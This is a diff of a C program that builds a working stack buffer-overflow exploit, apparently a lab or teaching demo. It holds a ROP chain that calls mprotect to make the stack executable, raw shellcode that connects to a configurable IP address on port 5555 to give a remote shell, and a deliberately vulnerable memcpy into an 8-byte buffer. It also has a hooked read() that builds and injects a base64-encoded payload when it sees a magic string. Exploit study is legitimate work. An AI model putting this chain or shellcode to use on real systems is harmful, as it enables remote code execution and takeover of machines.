@@ -7,47 +7,140 @@
 #include <string.h>
 #include <unistd.h>
 
-typedef struct Offset
+static char encodingTable[] = {
+	'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
+	'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
+	'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
+	'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'};
+static int mod_table[] = {0, 2, 1};
+
+char *base64Encode(const unsigned char *data, size_t inputLength, size_t *outputLength) {
+	static char encodedData[10000];
+
+	*outputLength = 4 * ((inputLength + 2) / 3);
+
+	assert(*outputLength < sizeof(encodedData));
+
+	for (int i = 0, j = 0; i < inputLength;) {
+		uint32_t octet_a = i < inputLength ? (unsigned char)data[i++] : 0;
+		uint32_t octet_b = i < inputLength ? (unsigned char)data[i++] : 0;
+		uint32_t octet_c = i < inputLength ? (unsigned char)data[i++] : 0;
+
+		uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;
+
+		encodedData[j++] = encodingTable[(triple >> 3 * 6) & 0x3F];
+		encodedData[j++] = encodingTable[(triple >> 2 * 6) & 0x3F];
+		encodedData[j++] = encodingTable[(triple >> 1 * 6) & 0x3F];
+		encodedData[j++] = encodingTable[(triple >> 0 * 6) & 0x3F];
+	} // for
+
+	for (int i = 0; i < mod_table[inputLength % 3]; i++)
+		encodedData[*outputLength - 1 - i] = '=';
+
+	return encodedData;
+}
+
+static const unsigned char pr2six[256] = {
+	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
+	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
+	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,
+	52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,
+	64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
+	15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,
+	64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
+	41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,
+	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
+	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
+	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
+	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
+	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
+	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
+	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
+	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64
+};
+
+static int base64Decode(char *bufplain, const char *bufcoded)
 {
+	int nBytesDecoded;
+	register const unsigned char *bufin;
+	register unsigned char *bufout;
+	register int nprbytes;
+
+	bufin = (const unsigned char *) bufcoded;
+	while (pr2six[*(bufin++)] <= 63);
+	nprbytes = (bufin - (const unsigned char *) bufcoded) - 1;
+	nBytesDecoded = ((nprbytes + 3) / 4) * 3;
+
+	bufout = (unsigned char *) bufplain;
+	bufin = (const unsigned char *) bufcoded;
+
+	while (nprbytes > 4) {
+		*(bufout++) = (unsigned char) (pr2six[bufin[0]] << 2 | pr2six[bufin[1]] >> 4);
+		*(bufout++) = (unsigned char) (pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);
+		*(bufout++) = (unsigned char) (pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);
+		bufin += 4;
+		nprbytes -= 4;
+	}
+
+	/* Note: (nprbytes == 1) would be an error, so just ingore that case */
+	if (nprbytes > 1) {
+		*(bufout++) = (unsigned char) (pr2six[*bufin] << 2 | pr2six[bufin[1]] >> 4);
+	}
+	if (nprbytes > 2) {
+		*(bufout++) = (unsigned char) (pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);
+	}
+	if (nprbytes > 3) {
+		*(bufout++) = (unsigned char) (pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);
+	}
+
+	*(bufout++) = '\0';
+	nBytesDecoded -= (4 - nprbytes) & 3;
+
+	return nBytesDecoded;
+}
+
+typedef void *Pointer;
+
+typedef struct Offset {
 	long	r : 48;
 	char	b : 8;
 	char	f : 8;
 } Offset, *OffsetPtr;
 
 typedef union AddressUnion {
-	void	*p;
+	Pointer	p;
 	Offset	o;
 	char	c[8];
 } AddressUnion, *AddressUnionPtr;
 
 typedef struct ShellCode {
-	unsigned char prolog[18];
-	unsigned short port;
-	unsigned char address[4];
-	unsigned char epilog[50];
+	unsigned char	prolog[18];
+	unsigned short	port;
+	unsigned char	address[4];
+	unsigned char	epilog[50];
 } ShellCode, *ShellCodePtr;
 
 typedef union ShellCodeUnion {
-	unsigned char raw[74];
-	ShellCode sc; 
+	unsigned char	raw[74];
+	ShellCode	sc; 
 } ShellCodeUnion, *ShellCodeUnionPtr;
 
 typedef struct Payload {
 	char		pl_dst[8];
-	void		*pl_canary;
-	void		*pl_rbp;
+	AddressUnion	pl_canary;
+	AddressUnion	pl_rbp;
 	AddressUnion	pl_popRDI;
-	void		*pl_stackPage;
+	AddressUnion	pl_stackPage;
 	AddressUnion	pl_popRSI;
 	ptrdiff_t	pl_stackSize;
 	AddressUnion	pl_popRDX;
 	long		pl_permission;
 	AddressUnion	pl_mprotect;
-	void		*pl_shellCode;
-	ShellCodeUnion	scu;
+	AddressUnion	pl_shellCode;
+	ShellCodeUnion	pl_scu;
 } Payload, *PayloadPtr;
 
-static const char *s_elf_signature = "\0x7fELF";
+static const char s_elf_signature[] = {0x7F, 'E', 'L', 'F', 0};
 
 static const char *s_magic = "xyzzy";
 
@@ -62,7 +155,7 @@ static const char *s_libc_mprotect = "mprotect";
 static const char *s_libc_read     = "read";
 
 static Payload payload = {
-	.scu = {
+	.pl_scu = {
 		.raw = {
 			0x6a, 0x29,					// pushq	$0x29
 			0x58,						// pop		%rax
@@ -108,23 +201,26 @@ static Payload payload = {
 _Bool initialized = 0;
 
 ssize_t (*libc_read)(int fd, void *buf, size_t count)	= NULL;
-void *libc_mprotect					= NULL;
-void *libc_base						= NULL;
-void *pie_base						= NULL;
+Pointer libc_mprotect					= NULL;
+Pointer libc_base					= NULL;
+Pointer pie_base					= NULL;
+Pointer stack_base					= NULL;
+Pointer buffer_base					= NULL;
 
-static inline void *pageBase(void *p) {
-	return (void *) (((unsigned long) p) & (-1^getpagesize()-1));
+static Pointer pageBase(Pointer p) {
+	return (Pointer) (((unsigned long) p) & (-1^getpagesize()-1));
 } // pageBase()
 
-static inline void *elfBase(void *p) {
+static Pointer elfBase(Pointer p) {
 	p = pageBase(p);
-	while (strncmp(p, s_elf_signature, strlen(s_elf_signature)))
+	while (strncmp(p, s_elf_signature, strlen(s_elf_signature))) {
 		p -= getpagesize();
+	} // while
 
 	return p;
 } // elfBase()
 
-static inline void *stackPage(void) {
+static Pointer stackPage(void) {
 	int dummy = 0;
 
 	return pageBase(&dummy);
@@ -140,44 +236,48 @@ static void initialize(void)
 
 		pie_base	= elfBase(initialize);
 
-		initialized = 1;
+		stack_base	= stackPage();
+
+		//initialized = 1;
 	} // if
 
 	return;
 } // initialize()
 
-static void overflow(char *src, size_t n) {
-	char dst[8] = {0};
-
-	printf("In overflow()");
-
-	memcpy(dst, src, n);
-} // overflow()
-
-static void *baseAddress(char base) {
+static Pointer baseAddress(char base) {
 	switch (base) {
+		case 'B' : return buffer_base;
 		case 'L' : return libc_base;
+		case 'S' : return stack_base; // Actually just base of current stack page
 		case 'X' : return pie_base;
 		default  : return 0;
 	} // switch
 } // baseAddress()
 
-static inline Offset pointerToOffset(void *p, char base) {
+static inline Offset pointerToOffset(Pointer p, char base) {
 	return (Offset) { (p - baseAddress(base)), base, '~' };
-} // composeOffset()
+} // pointerToOffset()
 
-static inline void *offsetToPointer(Offset o) {
-	return (void *) (o.r + baseAddress(o.b));
+static inline Offset indirectToOffset(Pointer p, char base) {
+	return (Offset) { (p - baseAddress(base)), base, '*' };
+} // indirectToOffset()
+
+static inline Pointer offsetToPointer(Offset o) {
+	return (Pointer) (o.r + baseAddress(o.b));
 } // offsetToPointer()
+
+static inline Pointer offsetToIndirect(Offset o) {
+	return *((Pointer *) offsetToPointer(o));
+} // offsetToIndirect()
 
 static AddressUnion fixupAddressUnion(AddressUnion au) {
 	if (au.o.f == '~')
 		return (AddressUnion) { .p = offsetToPointer(au.o) };
 
-	assert(au.o.f == 0);
-	assert(au.o.b == 0);
+	if (au.o.f == '*')
+		return (AddressUnion) { .p = offsetToIndirect(au.o) };
 
-	return (AddressUnion) { .p = (void *) (unsigned long) au.o.r };
+	return (AddressUnion) { .p = (Pointer) (unsigned long) au.o.r };
 } // fixupAddressUnion()
 
 static void makeload(PayloadPtr plp) {
@@ -185,27 +285,28 @@ static void makeload(PayloadPtr plp) {
 
 	ptrdiff_t libc_mprotect_offset = libc_mprotect - libc_base;
 
+	// Offsets are relative to the payload
+	buffer_base		= plp;
+
 	memset(plp->pl_dst, 0, sizeof(plp->pl_dst));
-	plp->pl_canary		= NULL;
-	plp->pl_rbp		= NULL;
-	//plp->pl_popRDI	= &&l_poprdi;
+
+	plp->pl_canary.o	= indirectToOffset(&plp->pl_canary, 'B');
+	plp->pl_rbp.o		= indirectToOffset(&plp->pl_rbp, 'B');
 	plp->pl_popRDI.o	= pointerToOffset(&&l_poprdi, 'X');
-	plp->pl_stackPage	= stackPage();
-	//plp->pl_popRSI	= &&l_poprsi;
+	plp->pl_stackPage.o	= pointerToOffset(stack_base, 'S');
 	plp->pl_popRSI.o	= pointerToOffset(&&l_poprsi, 'X');
 	plp->pl_stackSize	= getpagesize();
-	//plp->pl_popRDX	= &&l_poprdx;
 	plp->pl_popRDX.o	= pointerToOffset(&&l_poprdx, 'X');
 	plp->pl_permission	= 0x7;
 	plp->pl_mprotect.o	= pointerToOffset(libc_mprotect, 'L');
 
-	plp->pl_shellCode	= &plp->scu; // Must be updated whenever *plp moves
+	plp->pl_shellCode.o	= pointerToOffset(&plp->pl_scu, 'B');
 
-	plp->scu.sc.port        = htons(5555);
-	plp->scu.sc.address[0]  = 10; //127;
-	plp->scu.sc.address[1]  = 0;  //0;
-	plp->scu.sc.address[2]  = 1;  //0;
-	plp->scu.sc.address[3]  = 24; //1;
+	plp->pl_scu.sc.port       = htons(5555);
+	plp->pl_scu.sc.address[0] = 10;
+	plp->pl_scu.sc.address[1] = 0;
+	plp->pl_scu.sc.address[2] = 1;
+	plp->pl_scu.sc.address[3] = 24;
 
 	// This construct keeps the compiler from removing what it thinks is dead code in gadgets that follow:
 	int volatile v = 0;
@@ -238,47 +339,56 @@ static void dumpload(PayloadPtr plp) {
 	printf("In dumpload()\n");
 
 	printf("--------------------------------------------\n");
-	printf("%20s: %p\n",           "plp->pl_canary",       plp->pl_canary);
-	printf("%20s: %p\n",           "plp->pl_rbp",          plp->pl_rbp);
-	printf("%20s: %p\n",           "plp->pl_popRDI.p",     plp->pl_popRDI.p);
-	printf("%20s: %p\n",           "plp->pl_stackPage",    plp->pl_stackPage);
-	printf("%20s: %p\n",           "plp->pl_popRSI.p",     plp->pl_popRSI.p);
-	printf("%20s: %#tx\n",         "plp->pl_stackSize",    plp->pl_stackSize);
-	printf("%20s: %p\n",           "plp->pl_popRDX.p",     plp->pl_popRDX.p);
-	printf("%20s: %#tx\n",         "plp->pl_permission",   plp->pl_permission);
-	printf("%20s: %p\n",           "plp->pl_mprotect.p",   plp->pl_mprotect.p);
-	printf("%20s: %p\n",           "plp->pl_shellCode",    plp->pl_shellCode);
-	printf("%20s: %d\n",           "plp->scu.sc.port",     ntohs(plp->scu.sc.port));
-	printf("%20s: %d.%d.%d.%d\n",  "plp->scu.sc.address",  plp->scu.sc.address[0], plp->scu.sc.address[1], plp->scu.sc.address[2], plp->scu.sc.address[3]);
+	printf("%20s: %p\n",           "pl_canary.p",       plp->pl_canary.p);
+	printf("%20s: %p\n",           "pl_rbp.p",          plp->pl_rbp.p);
+	printf("%20s: %p\n",           "pl_popRDI.p",       plp->pl_popRDI.p);
+	printf("%20s: %p\n",           "pl_stackPage.p",    plp->pl_stackPage.p);
+	printf("%20s: %p\n",           "pl_popRSI.p",       plp->pl_popRSI.p);
+	printf("%20s: %#tx\n",         "pl_stackSize",      plp->pl_stackSize);
+	printf("%20s: %p\n",           "pl_popRDX.p",       plp->pl_popRDX.p);
+	printf("%20s: %#tx\n",         "pl_permission",     plp->pl_permission);
+	printf("%20s: %p\n",           "pl_mprotect.p",     plp->pl_mprotect.p);
+	printf("%20s: %p\n",           "pl_shellCode.p",    plp->pl_shellCode.p);
+	printf("%20s: %d\n",           "pl_scu.sc.port",    ntohs(plp->pl_scu.sc.port));
+	printf("%20s: %d.%d.%d.%d\n",  "pl_scu.sc.address", plp->pl_scu.sc.address[0], plp->pl_scu.sc.address[1], plp->pl_scu.sc.address[2], plp->pl_scu.sc.address[3]);
 	printf("--------------------------------------------\n");
 } // dumpload()
 
 static void doFixups(PayloadPtr plp) {
-	plp->pl_popRDI = fixupAddressUnion(plp->pl_popRDI);
-	plp->pl_popRSI = fixupAddressUnion(plp->pl_popRSI);
-	plp->pl_popRDX = fixupAddressUnion(plp->pl_popRDX);
-	plp->pl_mprotect = fixupAddressUnion(plp->pl_mprotect);
+	plp->pl_canary    = fixupAddressUnion(plp->pl_canary);
+	plp->pl_rbp       = fixupAddressUnion(plp->pl_rbp);
+	plp->pl_popRDI    = fixupAddressUnion(plp->pl_popRDI);
+	plp->pl_stackPage = fixupAddressUnion(plp->pl_stackPage);
+	plp->pl_popRSI    = fixupAddressUnion(plp->pl_popRSI);
+	plp->pl_popRDX    = fixupAddressUnion(plp->pl_popRDX);
+	plp->pl_mprotect  = fixupAddressUnion(plp->pl_mprotect);
+        plp->pl_shellCode = fixupAddressUnion(plp->pl_shellCode); // Be sure that buffer_base is set by now.
 } // doFixups()
 
 static void fillload(PayloadPtr plp, size_t n) {
 	char dst[8] = {0};
 
-	printf("In fillload()\n");
-
-	// Help the hacker by populating the payload with the correct canary and saved frame pointer
-	memcpy(plp->pl_dst, dst, sizeof(plp->pl_dst) + sizeof(plp->pl_canary) + sizeof(plp->pl_rbp));
-
-	plp->pl_shellCode = &dst[0] + ((void *)(&plp->scu) - (void *)plp);
-	plp->pl_shellCode = ((void *) &dst) + ((void *)(&plp->scu) - (void *)plp);
+	printf("In fillload(), &dst: %p\n", dst);
 
 	// Fixups
-	doFixups(plp);
+	//buffer_base = &dst;
+	//doFixups(plp);
 } // fillload()
 
-ssize_t read(int fd, void *buf, size_t count) {
-	if (!initialized)
-		initialize();
+static void overflow(Pointer src, size_t n) {
+	char dst[8] = {0};
 
+	printf("In overflow(), &dst: %p, n: %td\n", dst, n);
+
+	// Fixups
+	buffer_base = &dst;
+	doFixups((PayloadPtr) src);
+
+	memcpy(dst, src, n);
+} // overflow()
+
+ssize_t read(int fd, void *buf, size_t count) {
+	initialize(); // (or libc_read() won't be defined
 	ssize_t result = libc_read(fd, buf, count);
 
 	char *p = (result < strlen(s_magic)) ? NULL : strstr(buf, s_magic);
@@ -286,16 +396,53 @@ ssize_t read(int fd, void *buf, size_t count) {
 	if (p)
 	{
 		p += strlen(s_magic);
-		if (!strncmp(s_makeload, p, strlen(s_makeload)))
+		if (!strncmp(s_makeload, p, strlen(s_makeload))) {
 			makeload(&payload);
+dumpload(&payload);
+			// Temporary kludge for setting IP address
+			unsigned char a, b, c, d;
+			int num_chars;
+			if (sscanf(p + strlen(s_makeload), "%hhu.%hhu.%hhu.%hhu%n", &a, &b, &c, &d, &num_chars) == 4) {
+				payload.pl_scu.sc.address[0] = a;
+				payload.pl_scu.sc.address[1] = b;
+				payload.pl_scu.sc.address[2] = c;
+				payload.pl_scu.sc.address[3] = d;
+			} else {
+				printf("Bad IP. Using 127.0.0.1\n");
+				a = 127; b = 0; c = 0; d = 1;
+				num_chars = 0;
+			} // else
+
+dumpload(&payload);
+			size_t payload64Size;
+			char *payload64 = base64Encode((const unsigned char *) &payload, sizeof(payload), &payload64Size);
+printf("payload64Size: %td\n", payload64Size);
+			char *src = p + strlen(s_makeload) + num_chars;
+			char *dst = p - strlen(s_magic) + payload64Size;
+			int need = strlen(s_magic) - strlen(s_makeload) - num_chars + payload64Size;
+			int tail = result - (src - ((char *) buf));
+			memmove(dst, src, tail);
+			memcpy(((char *) p) - strlen(s_magic), payload64, payload64Size);
+			result += need;
+			((char *) buf)[result] = 0;
+		} // if
 		else if (!strncmp(s_dumpload, p, strlen(s_dumpload)))
 			dumpload(&payload);
 		else if (!strncmp(s_fillload, p, strlen(s_fillload)))
 			fillload(&payload, sizeof(payload));
-		else if (!strncmp(s_testload, p, strlen(s_testload)))
-			overflow((char *)&payload, sizeof(payload));
-		else if (!strncmp(s_overflow, p, strlen(s_overflow)))
-			overflow(p, result - (p - (char *) buf));
+		else if (!strncmp(s_testload, p, strlen(s_testload))) {
+			makeload(&payload);
+			fillload(&payload, sizeof(payload));
+			overflow((Pointer)&payload, sizeof(payload));
+		}
+		else if (!strncmp(s_overflow, p, strlen(s_overflow))) {
+			base64Decode(p, p + strlen(s_overflow));
+dumpload((PayloadPtr) p);
+			fillload(((PayloadPtr) p), sizeof(Payload));
+dumpload((PayloadPtr) p);
+			overflow(p, sizeof(Payload));
+
+		} // else if
 	} // if
 
 	return result;
@@ -308,6 +455,7 @@ int main(int argc, char **argv)
 	assert(sizeof(int) == 4);
 	assert(sizeof(long) == 8);
 	assert(sizeof(void *) == 8);
+	assert(sizeof(Pointer) == 8);
 	assert(sizeof(ptrdiff_t) == 8);
 	assert(sizeof(Offset) == 8);
 	assert(sizeof(AddressUnion) == 8);
@@ -316,11 +464,12 @@ int main(int argc, char **argv)
 	assert(getpagesize() == 4096);
 	assert((-1^(getpagesize()-1))==0xfffffffffffff000);
 
-	initialize();
-	makeload(&payload);
-	dumpload(&payload);
-	fillload(&payload, sizeof(payload));
-	dumpload(&payload);
-	overflow((char *) &payload, sizeof(payload));
+return -1;
+        initialize();
+        makeload(&payload);
+        dumpload(&payload);
+        fillload(&payload, sizeof(payload));
+        dumpload(&payload);
+        overflow((char *) &payload, sizeof(payload));
 } // main()
 #endif
